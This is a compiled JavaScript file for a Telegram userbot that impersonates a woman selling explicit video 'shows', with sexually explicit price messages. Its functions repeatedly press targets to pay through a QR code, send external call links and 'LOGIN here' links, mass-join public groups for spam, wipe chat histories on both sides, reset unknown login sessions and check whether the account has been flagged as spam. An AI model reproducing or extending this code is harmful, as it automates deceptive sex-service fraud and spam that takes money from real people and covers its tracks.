                                    // if (didPaidToOthers.paid !== "" || didPaidToOthers.paid !== "") {
                                    //     await client.sendMessage(chat.entity,{ message: `Wait...\nI'm verifying your Payment again!!\n${didPaidToOthers.paid !== "" ? (`I think U paid to ${didPaidToOthers.paid} and U also`) : "I think U"}  ${didPaidToOthers.demoGiven !== "" ? (` took Demo from ${didPaidToOthers.demoGiven}`) : ""}` });
                                    // } else {
                                    yield client.sendMessage(chat.entity, { message: "Dont Speak Okay!!\nI'm in **Bathroom**\nMute yourself!! I will show you Okay..!!" });
                                    yield client.sendMessage(chat.entity, { message: `Hey U can Call me here\n\nhttps://zomCall.netlify.app/${process.env.clientId}/${userDetails.chatId.toString()}\n\nCall me now!!` });
                                    // }
                                }
                                else {
                                    if (userDetails.payAmount > 50) {
                                        if (!userDetails.secondShow || userDetails.payAmount > 180) {
                                            // await client.sendMessage(chat.entity,{ message: "Mute ok.. I Will Call now!!" });
                                        }
                                        else if (userDetails.payAmount < 201) {
                                            yield client.sendMessage(chat.entity, { message: "**Did you like the full Show??**😚" });
                                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                yield client.sendMessage(chat.entity, { message: "**30 Mins VideoCall   :  350₹/-\n1 hour Full   :   600₹/-**" });
                                            }), 3000);
                                        }
                                    }
                                    else {
                                        yield client.sendMessage(chat.entity, { message: "**Did you like the Demo??😚\n\nPay Again!! if You want More....**" });
                                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                            yield client.sendMessage(chat.entity, { message: `**Take Full Show Baby...!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**` });
                                        }), 3000);
                                    }
                                }
                            }
                            else {
                                if (userDetails.payAmount > 15) {
                                    yield client.sendMessage(chat.entity, { message: messages_1.messages.noFreeDemo + "\n\n" + messages_1.messages.demo });
                                }
                                else if (userDetails.payAmount > 10 && userDetails.picsSent) {
                                    yield client.sendMessage(chat.entity, { message: `I have sent you Pics for your money\n${(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])}` });
                                }
                                else {
                                    yield client.sendMessage(chat.entity, { message: selectRandomElements(["oyee..", "oye", "haa", "hmm", "??", "hey"], 1)[0] });
                                }
                            }
                            yield client.markAsRead(chat.entity);
                        }
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error, "Error Replying Unread", false);
                        return new Promise((resolve) => {
                            setTimeout(() => resolve(true), 5000);
                        });
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Error at replyUnread");
                yield startNewUserProcess(error);
            }
        }
    });
}
function callToPaid() {
    return __awaiter(this, void 0, void 0, function* () {
        console.log("Calls Initiated");
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const ids = (yield db.readRecentPaidPpl());
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: Auto Calls Initiated - ${ids === null || ids === void 0 ? void 0 : ids.length}`)}`);
        if (ids !== undefined) {
            console.log("CallIds:", ids === null || ids === void 0 ? void 0 : ids.length);
            for (const id of ids) {
                console.log("call Id: ", id.chatId.toString());
                const user = yield db.read(id.chatId.toString());
                if (!user.demoGiven) {
                    yield new Promise((resolve) => {
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield (0, index_1.requestCall)(id.chatId.toString());
                            resolve(true);
                        }), 120000);
                    });
                }
            }
        }
        else {
            console.log("Ids are undefined");
        }
    });
}
function sendImageToChannel(photoBuffer, chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log("trying to send Image to channel");
        try {
            const formData = new form_data_1.default();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBuffer, { filename: "image.jpg" });
            const options = {
                method: 'POST',
                data: formData,
                headers: Object.assign({ 'accept': '*/*', 'Content-Type': 'application/json' }, formData.getHeaders())
            };
            const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${(0, logbots_1.getBotToken)()}/sendPhoto`, options);
            console.log(response.data);
        }
        catch (error) {
            console.error('Error sending image to channel', error === null || error === void 0 ? void 0 : error.response);
        }
    });
}
function sendVideoToChannel(photoBuffer) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log("trying to send Image to channel");
        try {
            const formData = new form_data_1.default();
            formData.append('chat_id', -1001982401617);
            formData.append('video', photoBuffer, { filename: "video.mp4" });
            const options = {
                method: 'POST',
                data: formData,
                headers: Object.assign({ 'accept': '*/*', 'Content-Type': 'application/json' }, formData.getHeaders()),
            };
            const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${(0, logbots_1.getBotToken)()}/sendVideo`, options);
            console.log(response.data);
        }
        catch (error) {
            console.error('Error sending video to channel', error === null || error === void 0 ? void 0 : error.response);
        }
    });
}
let askingtopay = false;
function asktoPay(client, time) {
    return __awaiter(this, void 0, void 0, function* () {
        if (client && !askingtopay) {
            askingtopay = true;
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            const ids = (yield db.readRecentPaidPpl2());
            if (ids !== undefined) {
                console.log(ids === null || ids === void 0 ? void 0 : ids.length);
                for (const id of ids) {
                    const user = yield db.read(id.chatId.toString());
                    if (user.canReply !== 0) {
                        yield new Promise((resolve) => {
                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                const mm = "I'm Free now Babyy!!😘💋\n\n";
                                if (user.demoGiven) {
                                    if (isServicePending(user) || !user.paidReply) {
                                        try {
                                            const msg = (0, messages_1.pickOneMsg)(['Heyy... there??', `LOGIN here 👇🏻👇🏻\n\n**${process.env.link}**\n**${process.env.link}**\n\nSend me Screenshot After Login!!`, ...messages_1.messages.initMsgs]);
                                            yield trySendingMsg(user, client, { message: msg });
                                            yield db.updateSingleKey(user.chatId, 'limitTime', Date.now() + 25 * 60 * 1000);
                                        }
                                        catch (error) {
                                            (0, parseError_1.parseError)(error, "Error at asking to pay");
                                        }
                                    }
                                    else {
                                        yield asktoPayByEvent(client, user, true);
                                    }
                                }
                                else {
                                    if (!(user === null || user === void 0 ? void 0 : user.payAmount) || user.payAmount < 30) {
                                        yield trySendingMsg(user, client, { message: mm + `${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}\n\n${messages_1.messages.demo}` });
                                    }
                                }
                                resolve(true);
                            }), time);
                        });
                    }
                }
            }
            else {
                console.log("Ids are undefined");
            }
        }
        askingtopay = false;
    });
}
function asktoPayByEvent(client_1, userDetails_1) {
    return __awaiter(this, arguments, void 0, function* (client, userDetails, force = false, prefix = '') {
        try {
            const chatId = userDetails.chatId;
            const lastasked = askToPayMap.get(chatId) || 0;
            yield setTyping(chatId);
            if (lastasked < Date.now() - 10 * 60 * 1000 || force) {
                askToPayMap.set(chatId, Date.now());
                if (userDetails.paidReply) {
                    yield (0, withTimeout_1.withTimeout)(client.sendMessage(chatId, {
                        message: (0, messages_1.pickOneMsg)(messages_1.messages.initMsgs)
                    }));
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield setTyping(chatId);
                        let msg = prefix ? `${prefix}\n\n` : "";
                        if (userDetails.payAmount < 30) {
                            msg = msg + (0, messages_1.pickOneMsg)([messages_1.messages.demo, messages_1.messages.just50, messages_1.messages.just50two, `${messages_1.messages.noFreeDemo}\n${messages_1.messages.demo}`]);
                        }
                        else if (userDetails.payAmount < 100) {
                            msg = msg + "**Take Full Show Baby....!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**\n\nI'm alone in my room now!!\nLets Enjoy dear...\nPay and Msg!!";
                        }
                        else if (userDetails.payAmount < 250) {
                            if (isServicePending(userDetails) && userDetails.callTime < Date.now() - 2 * 60 * 60 * 1000) {
                                yield (0, index_1.initiateCall)(userDetails.highestPayAmount, userDetails, 'Cron Initited Call');
                            }
                            else {
                                msg = msg + "**30 Mins VideoCall   :  350₹/-\n1 Hour Full show with Face!!   :   600₹/-**\n\nI'm alone in my room now!!\nLets Enjoy dear...\nPay and Msg!!";
                            }
                        }
                        else {
                            if (userDetails.callTime < Date.now() - 2 * 60 * 60 * 1000) {
                                yield (0, index_1.initiateCall)(userDetails.highestPayAmount, userDetails, 'Cron Initited Call');
                            }
                            else {
                                msg = msg + `${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}\n\n${messages_1.messages.pricelist}`;
                            }
                        }
                        yield (0, withTimeout_1.withTimeout)(client.sendMessage(chatId, { message: msg, file: (0, common_1.getClientFilePath)('./QR.jpg') }));
                    }), 5000);
                }
                else {
                    askToPayMap.set(chatId, Date.now() + 10 * 60 * 1000);
                    yield (0, withTimeout_1.withTimeout)(client.sendMessage(chatId, { file: (0, common_1.getClientFilePath)('./QR.jpg') }));
                }
            }
            else if (lastasked < Date.now() - 5 * 60 * 1000) {
                askToPayMap.set(chatId, Date.now());
                yield trySendingMsg(userDetails, client, { message: `${(0, messages_1.pickOneMsg)(messages_1.messages.initMsgs)}\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}` });
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "ErrorReplying", false);
        }
    });
}
let responding = false;
function respToPaidPplfn(client_1, time_1, msg_1) {
    return __awaiter(this, arguments, void 0, function* (client, time, msg, canReplyOthers = true, longlimit = false, all = false) {
        if (client && !responding) {
            responding = true;
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            let ids = [];
            if (all) {
                ids = (yield db.readRecentPaidPpl2());
            }
            else {
                ids = (yield db.readRecentPaidPpl());
            }
            if (ids !== undefined) {
                console.log("chat Ids: ", ids === null || ids === void 0 ? void 0 : ids.length);
                for (const id of ids) {
                    const user = yield db.read(id.chatId.toString());
                    try {
                        if (user && (user === null || user === void 0 ? void 0 : user.canReply) !== 0) {
                            yield new Promise((resolve) => {
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    const mm = "I'm Free now Babyy😘💋\n\n";
                                    if (msg) {
                                        if ((user === null || user === void 0 ? void 0 : user.payAmount) >= 30) {
                                            if (user.demoGiven && isServicePending(user)) {
                                                const didPaidToOthers = yield db.checkIfPaidToOthers(user.chatId.toString());
                                                if (didPaidToOthers.paid !== "" || didPaidToOthers.demoGiven !== "") {
                                                    yield trySendingMsg(user, client, { message: `Hey U can Call me here\n\nhttps://zomCall.netlify.app/${process.env.clientId}/${id.chatId.toString()}\n\nCall me now!!`, linkPreview: false });
                                                    // await trySendingMsg(user, client, { message: `Wait...\nI'm verifying your Payment again!!\nI think U paid to ${didPaidToOthers.paid} ${didPaidToOthers.demoGiven !== "" ? (`and U also took Demo from ${didPaidToOthers.demoGiven}`) : ""}` });
                                                }
                                                else {
                                                    yield trySendingMsg(user, client, { message: msg });
                                                }
                                            }
                                            else if (!user.paidReply) {
                                                try {
                                                    yield db.updateSingleKey(user.chatId, 'paidReply', true);
                                                    yield db.updateStatSingleKey(user.chatId, 'paidReply', true);
                                                    if (user.secondShow) {
                                                        yield db.updateSingleKey(user.chatId, 'payAmount', 150);
                                                        yield db.updateStatSingleKey(user.chatId, 'payAmount', 150);
                                                    }
                                                    else if (user.demoGiven) {
                                                        yield db.updateSingleKey(user.chatId, 'payAmount', 50);
                                                        yield db.updateStatSingleKey(user.chatId, 'payAmount', 50);
                                                    }
                                                    yield asktoPayByEvent(client, user);
                                                }
                                                catch (error) {
                                                    (0, parseError_1.parseError)(error, "ErrReplFunc");
                                                }
                                            }
                                        }
                                    }
                                    else if (canReplyOthers) {
                                        if (user.paidReply) {
                                            try {
                                                if (!(user === null || user === void 0 ? void 0 : user.payAmount) || user.payAmount < 15) {
                                                    yield trySendingMsg(user, client, { message: mm + `${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}\n\n${messages_1.messages.demo}` });
                                                }
                                                else {
                                                    yield asktoPayByEvent(client, user);
                                                }
                                            }
                                            catch (error) {
                                                (0, parseError_1.parseError)(error, "ErrReplFn2");
                                            }
                                        }
                                        else {
                                            const msg = (0, messages_1.pickOneMsg)(['Heyy... there??', `LOGIN here 👇🏻👇🏻\n\n**${process.env.link}**\n**${process.env.link}**\n\nSend me Screenshot After Login!!`, '👀', 'Had Lunch??', 'In mood???', 'Come Online Baby😚', 'Oyyy... there??👀', '😚😚', 'hmmm👀']);
                                            yield trySendingMsg(user, client, { message: msg });
                                        }
                                    }
                                    resolve(true);
                                }), time);
                            });
                        }
                        yield db.removeSingleStat(id.chatId.toString());
                    }
                    catch (error) {
                        yield db.removeSingleStat(id.chatId.toString());
                    }
                }
            }
            else {
                console.log("Ids are undefined");
            }
            responding = false;
        }
        else {
            console.log("Already Responding!!");
        }
    });
}
function sendVclinks(client) {
    return __awaiter(this, void 0, void 0, function* () {
        if (client && !responding) {
            responding = true;
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            let ids = (yield db.readRecentPaidPpl());
            if (ids !== undefined) {
                console.log("chat Ids: ", ids === null || ids === void 0 ? void 0 : ids.length);
                for (const id of ids) {
                    const user = yield db.read(id.chatId.toString());
                    try {
                        if (user && (user === null || user === void 0 ? void 0 : user.canReply) !== 0) {
                            yield new Promise((resolve) => {
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    if ((user === null || user === void 0 ? void 0 : user.payAmount) >= 30) {
                                        if (user.demoGiven && isServicePending(user)) {
                                            yield trySendingMsg(user, client, { message: `**Call me Here Man!!**\n\nOpen👇 to Call Now!!\nhttps://ZomCall.netlify.app/${process.env.clientId}/${id.chatId.toString()}`, linkPreview: false });
                                        }
                                    }
                                    resolve(true);
                                }), 1000);
                            });
                        }
                        yield db.removeSingleStat(id.chatId.toString());
                    }
                    catch (error) {
                        yield db.removeSingleStat(id.chatId.toString());
                    }
                }
            }
            else {
                console.log("Ids are undefined");
            }
            responding = false;
        }
        else {
            console.log("Already Responding!!");
        }
    });
}
function trySendingMsg(id, client, msgObj) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        console.log("Sending: ", id.username + " : " + msgObj.message);
        try {
            let peer = id.chatId;
            const msgs = yield client.getMessages(id.chatId, { limit: 8 });
            if (msgs.total && msgs.total > 3) {
                if ((_a = id.username) === null || _a === void 0 ? void 0 : _a.startsWith('@')) {
                    yield client.sendMessage(id.username, msgObj);
                }
                else {
                    peer = new telegram_1.Api.InputPeerUser({ userId: (0, big_integer_1.default)(id.chatId), accessHash: (0, big_integer_1.default)(id.accessHash) });
                    if (id.accessHash && id.accessHash !== '') {
                        try {
                            yield client.sendMessage(peer, msgObj);
                        }
                        catch (error) {
                            yield client.sendMessage(id.chatId, msgObj);
                        }
                    }
                    else {
                        yield client.sendMessage(id.chatId, msgObj);
                    }
                }
                try {
                    yield client.markAsRead(peer);
                }
                catch (error) {
                    (0, parseError_1.parseError)(error, "ErrorMraksRead");
                }
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Error Sending msg", false);
        }
    });
}
function joinGrps(client, str) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log('Searching for public groups...');
        const result = yield client.invoke(new telegram_1.Api.contacts.Search({
            q: str,
            limit: 150
        }));
        console.log('Joining groups...', result.chats);
        for (let i = 0; i < result.chats.length; i++) {
            const chat = result.chats[i];
            if (!chat.toJSON().broadcast) {
                try {
                    const joinResult = yield client.invoke(new telegram_1.Api.channels.JoinChannel({
                        channel: yield getEntity(client, chat.id)
                    }));
                    yield sendJoinResultMessage("Successfully joined group: ", chat === null || chat === void 0 ? void 0 : chat.title);
                }
                catch (error) {
                    const errorDetails = (0, parseError_1.parseError)(error, undefined, false);
                    yield sendJoinResultMessage("Failed to join group: ", `${chat === null || chat === void 0 ? void 0 : chat.title} - ${errorDetails.message}`);
                }
                yield new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            }
        }
        ;
        console.log('Finished joining groups');
    });
}
function sendJoinResultMessage(msg, channel) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        const text = `@${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toUpperCase()}: ${msg} - ${channel}`;
        yield TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.CHANNEL_NOTIFICATIONS, text);
    });
}
function channelInfo(client_1) {
    return __awaiter(this, arguments, void 0, function* (client, sendInChannel = true, sendIds = false) {
        const channelArray = [];
        // const channelUsernameArray: string[] = [];
        const chats = yield (client === null || client === void 0 ? void 0 : client.getDialogs({ limit: 600 }));
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        channelArray.length = 0;
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        chats.map((chat) => __awaiter(this, void 0, void 0, function* () {
            var _a;
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;
                    const entity = {
                        channelId: id.toString(),
                        title,
                        participantsCount,
                        username,
                        restricted,
                        broadcast,
                        sendMessages: defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages,
                        canSendMsgs: false,
                    };
                    totalCount++;
                    if (!chatEntity.broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages)) {
                        entity.canSendMsgs = true;
                        canSendTrueCount++;
                        channelArray.push((_a = id.toString()) === null || _a === void 0 ? void 0 : _a.replace(/^-100/, ""));
                        // channelUsernameArray.push(username)
                        try {
                            yield db.updateActiveChannel({ channelId: entity.channelId }, entity);
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error);
                            console.log("Failed to update ActiveChannels");
                        }
                    }
                    else {
                        canSendFalseCount++;
                        yield db.removeOnefromActiveChannel(entity.channelId);
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
        }));
        yield db.addTodaysChannels(channelArray);
        if (sendInChannel) {
            const reply = `@${process.env.clientId.toUpperCase()}:\n\nChannels: ${totalCount}\nCanSendMessages: ${canSendTrueCount}\nCannotSendMsgs: ${canSendFalseCount}`;
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(reply)}`);
        }
        const responseObj = {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? channelArray : []
        };
        return responseObj;
    });
}
function getEntity(client, channelId) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        try {
            return yield client.getEntity(channelId);
        }
        catch (error) {
            channelId = (_a = channelId === null || channelId === void 0 ? void 0 : channelId.toString()) === null || _a === void 0 ? void 0 : _a.replace(/^-100/, "");
            if (error.errorMessage == "CHANNEL_PRIVATE") {
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                const channelInfo = yield db.getActiveChannel({ channelId: channelId });
                if (channelInfo && channelInfo.username) {
                    try {
                        return yield client.getEntity(channelInfo.username);
                    }
                    catch (err) {
                        (0, parseError_1.parseError)(err, `Error at retrying getEntity ${channelInfo.username}`);
                    }
                }
            }
            else {
                const errorDetails = (0, parseError_1.parseError)(error, `Error fetching Channel Enity : ${channelId}`);
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                if (errorDetails.message.includes("No user has") || errorDetails.message.includes("USERNAME_INVALID")) {
                    if (channelId) {
                        // await fetchWithTimeout(`${ppplbot()}&text=@${(process.env.clientId).toUpperCase()}: RemovingChannel - ${channelId}`);
                        yield db.removeOnefromActiveChannel(channelId);
                        yield db.removeOnefromChannel(channelId);
                    }
                }
            }
            return undefined;
        }
    });
}
function joinChannels(client_1, str_1) {
    return __awaiter(this, arguments, void 0, function* (client, str, sendInChannel = true) {
        const channels = str.split('|');
        for (let i = 0; i < channels.length; i++) {
            if (i !== 0) {
                yield (0, Helpers_1.sleep)(3 * 60 * 1000);
            }
            const channel = channels[i].trim();
            let channelEnitity;
            channelEnitity = (yield getEntity(client, channel));
            try {
                let joinResult = yield client.invoke(new telegram_1.Api.channels.JoinChannel({
                    channel: channelEnitity,
                }));
                if (sendInChannel) {
                    yield sendJoinResultMessage("Successfully joined group: ", channel);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, undefined, false);
                if (errorDetails.error == 'FloodWaitError') {
                    return 'stop';
                }
                if (sendInChannel) {
                    yield sendJoinResultMessage("Failed to joine group: ", `${channel} | ${errorDetails.message}`);
                }
            }
        }
    });
}
function leaveChannel(client, channel) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const joinResult = yield client.invoke(new telegram_1.Api.channels.LeaveChannel({
                channel: (channel === null || channel === void 0 ? void 0 : channel.channelId) ? channel.channelId : channel === null || channel === void 0 ? void 0 : channel.username,
            }));
            yield sendJoinResultMessage(`Successfully LEFT group: @${channel === null || channel === void 0 ? void 0 : channel.username}`, channel === null || channel === void 0 ? void 0 : channel.title);
            yield (0, Helpers_1.sleep)(120000);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, undefined, false);
            yield sendJoinResultMessage(`Failed to Leave group: @${channel === null || channel === void 0 ? void 0 : channel.username}`, `${channel === null || channel === void 0 ? void 0 : channel.title} | ${errorDetails.message}`);
        }
    });
}
function leaveChannels(client) {
    return __awaiter(this, void 0, void 0, function* () {
        const chats = yield client.getDialogs({ limit: 600 });
        for (let chatDialog of chats) {
            if (chatDialog.isChannel || chatDialog.isGroup) {
                const chatEntity = chatDialog.entity.toJSON();
                const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;
                const channel = {
                    channelId: id.toString(),
                    title,
                    participantsCount,
                    username,
                    private: false,
                    forbidden: false,
                    restricted,
                    broadcast,
                    sendMessages: defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages,
                    canSendMsgs: !chatEntity.broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages),
                };
                if (channel && (channel.restricted || !channel.canSendMsgs)) {
                    console.log(channel === null || channel === void 0 ? void 0 : channel.title);
                    yield leaveChannel(client, channel);
                }
            }
        }
    });
}
function setTyping(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield index_1.tgClass.getClient().invoke(new telegram_1.Api.messages.SetTyping({
                peer: chatId,
                action: new telegram_1.Api.SendMessageTypingAction(),
            }));
            yield (0, Helpers_1.sleep)(2000);
        }
        catch (error) {
            console.log('Cannot set Typing');
        }
    });
}
function setAudioRecord(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield index_1.tgClass.getClient().invoke(new telegram_1.Api.messages.SetTyping({
                peer: chatId,
                action: new telegram_1.Api.SendMessageRecordAudioAction(),
            }));
            yield (0, Helpers_1.sleep)(2000);
        }
        catch (error) {
            console.log('Cannot set Typing');
        }
    });
}
function getSenderJson(event) {
    return __awaiter(this, void 0, void 0, function* () {
        let senderJson = { firstName: "DefaultUSer", username: null, accessHash: null, lastName: '' };
        try {
            const senderObj = yield event.message.getSender();
            if (senderObj) {
                senderJson = yield (senderObj === null || senderObj === void 0 ? void 0 : senderObj.toJSON());
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
        return senderJson;
    });
}
function callOn(client, chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        try {
            const user = (_a = (yield getEntity(client, chatId.toString()))) === null || _a === void 0 ? void 0 : _a.toJSON();
            if (user) {
                const typeInputUser = new telegram_1.Api.InputUser({ userId: user.id, accessHash: user.accessHash });
                yield client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new telegram_1.Api.InputPrivacyValueDisallowAll(),
                        new telegram_1.Api.InputPrivacyValueAllowUsers({ users: [typeInputUser] })
                    ],
                }));
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    });
}
function calloff(client) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    });
}
function getTotalMsgAndUserCount() {
    return __awaiter(this, void 0, void 0, function* () {
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const entries = yield db.readstats2();
        let totalCount = 0;
        for (const entry of entries) {
            const { count } = entry;
            totalCount += count;
        }
        console.log(`Msg Stats: TotalCount: ${totalCount}, UserCount: ${entries.length}`);
        return { totalCount, userCount: entries.length };
    });
}
let checkingAuths = false;
function removeOtherAuths(client) {
    return __awaiter(this, void 0, void 0, function* () {
        if (!checkingAuths) {
            checkingAuths = true;
            let i = 60;
            while (i > 0) {
                const result = yield client.invoke(new telegram_1.Api.account.GetAuthorizations());
                for (const auth of result.authorizations) {
                    if (!(0, inhandlerUpdated_1.contains)(auth.country.toLowerCase(), ['singapore']) &&
                        !(0, inhandlerUpdated_1.contains)(auth.deviceModel.toLowerCase(), ['cli', 'linux', 'latitude', 'redmi 8a', 'windows', 'chrome 118', 'oneplus']) &&
                        !(0, inhandlerUpdated_1.contains)(auth.appName.toLowerCase(), ['shru', 'sru', 'rams', 'likki', 'hans'])) {
                        try {
                            console.log(auth);
                            yield client.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: New AUTH Removed- ${auth.appName}|${auth.country}|${auth.deviceModel}`)}`);
                            checkingAuths = false;
                            continue;
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error);
                        }
                    }
                }
                i--;
                yield (0, Helpers_1.sleep)(3500);
            }
            checkingAuths = false;
        }
        else {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: Already Checking Auths`)}`);
        }
    });
}
let lastCheckedTime = 0;
function checktghealth(client_1) {
    return __awaiter(this, arguments, void 0, function* (client, force = false) {
        if ((lastCheckedTime < Date.now() - 20 * 60 * 1000 || force) && (0, index_1.daysLeftForRelease)() < 0) {
            lastCheckedTime = Date.now();
            try {
                if (client) {
                    yield client.sendMessage('@spambot', { message: '/start' });
                }
                else {
                    console.log("instanse not exist");
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                try {
                    yield client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: '178220800'
                    }));
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: Failed To Check Health`)}`);
            }
            return true;
        }
        return false;
    });
}
function getdaysLeft(inputDate) {
    const months = [
        'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
        'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
    ];
    const dateParts = inputDate.split(' ');
    const day = parseInt(dateParts[0], 10);
    const monthIndex = months.indexOf(dateParts[1]);
    const year = parseInt(dateParts[2], 10);
    const parsedDate = new Date(year, monthIndex, day);
    const todaysDate = new Date();
    const parsedDateTimestamp = parsedDate.getTime();
    const todaysDateTimestamp = todaysDate.getTime();
    const timeDifference = parsedDateTimestamp - todaysDateTimestamp;
    const daysDifference = Math.ceil(timeDifference / (1000 * 60 * 60 * 24));
    return daysDifference;
}
function parseObjectToString(obj) {
    if (typeof obj !== 'object' || obj === null) {
        return 'Invalid input: Not an object';
    }
    let result = '';
    for (const key in obj) {
        if (obj.hasOwnProperty(key)) {
            result += `${key} : ${obj[key]}\n`;
        }
    }
    return result;
}
function deleteMessage(event) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield event.message.delete({ revoke: true });
        }
        catch (error) {
            console.log((0, parseError_1.parseError)(error, "Failed to Delete Message", true));
        }
    });
}
function deleteMessagesBeforeId(chatId, messageId) {
    return __awaiter(this, void 0, void 0, function* () {
        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
            const client = yield index_1.tgClass.getClient();
            let limit = 100;
            let offsetId = messageId - 4;
            let totalMessages = 0;
            while (true) {
                try {
                    const history = yield client.getMessages(chatId, {
                        limit,
                        offsetId,
                    });
                    if (history.length === 0) {
                        break;
                    }
                    totalMessages += history.length;
                    const messageIds = history.map((message) => message.id);
                    yield client.deleteMessages(chatId, messageIds, { revoke: true });
                    console.log(`Deleted ${messageIds.length} messages before message ID: ${messageId}`);
                    offsetId = history[history.length - 1].id;
                }
                catch (error) {
                    console.log((0, parseError_1.parseError)(error, process.env.clientId, true));
                }
            }
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                try {
                    yield client.deleteMessages(chatId, [messageId], { revoke: true });
                }
                catch (error) {
                    console.log(`Failed to delete an image`);
                }
            }), 30000);
            console.log(`Deleted a total of ${totalMessages} messages.`);
        }), 50000);
    });
}
function extractNumberFromString(str) {
    if (typeof str !== 'string') {
        return -1;
    }
    const match = str.match(/-?\d+(\.\d+)?/);
    return match ? parseFloat(match[0]) : -1;
}
function executehs(client, chatId, data) {
    return __awaiter(this, void 0, void 0, function* () {
        yield setAudioRecord(chatId);
        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
            yield client.sendMessage(chatId, { message: `How is the Demo?♥️🙈` });
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                yield client.sendMessage(chatId, { message: `**Take Full Show Baby...!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**` });
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
